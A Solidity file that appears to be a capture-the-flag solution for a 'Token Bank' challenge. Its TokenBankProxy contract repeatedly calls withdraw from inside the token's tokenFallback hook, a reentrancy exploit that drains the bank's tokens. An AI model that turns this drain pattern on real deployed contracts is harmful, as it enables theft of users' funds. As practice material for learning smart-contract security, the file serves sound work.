pragma solidity ^0.7.4;


abstract contract ISimpleERC223Token {
    mapping (address => uint256) public balanceOf;

    function transfer(address to, uint256 value) external virtual returns (bool success);
}

abstract contract ITokenBankChallenge {
    ISimpleERC223Token public token;
    mapping(address => uint256) public balanceOf;

    function isComplete() external view virtual returns (bool);
    function withdraw(uint256 amount) external virtual;
}

contract TokenBankProxy {
    ITokenBankChallenge public target;
    
    constructor(address targetAddr) {
        target = ITokenBankChallenge(targetAddr);
    }

    function deposit() external payable {
        uint256 currentBalance = target.token().balanceOf(address(this));
        target.token().transfer(address(target), currentBalance);
    }

    function trigger_attack() external payable {
        reentrancy();

        require(target.isComplete(), "isComplete should return true");
    }

    function tokenFallback(address from, uint256 value, bytes calldata) external {
        require(msg.sender == address(target.token()), "tokenFallback should be called from original token");

        if (from != address(target)) {
            return;
        }

        reentrancy();
    }

    function reentrancy() private {
        uint256 initialBalance = target.balanceOf(address(this));
        uint256 remainingBalance = target.token().balanceOf(address(target));
        uint256 amount;

        if (remainingBalance > 0) {
            if (remainingBalance > initialBalance) {
                amount = initialBalance;
            } else {
                amount = remainingBalance;
            }            
            target.withdraw(amount);
        }
    }

}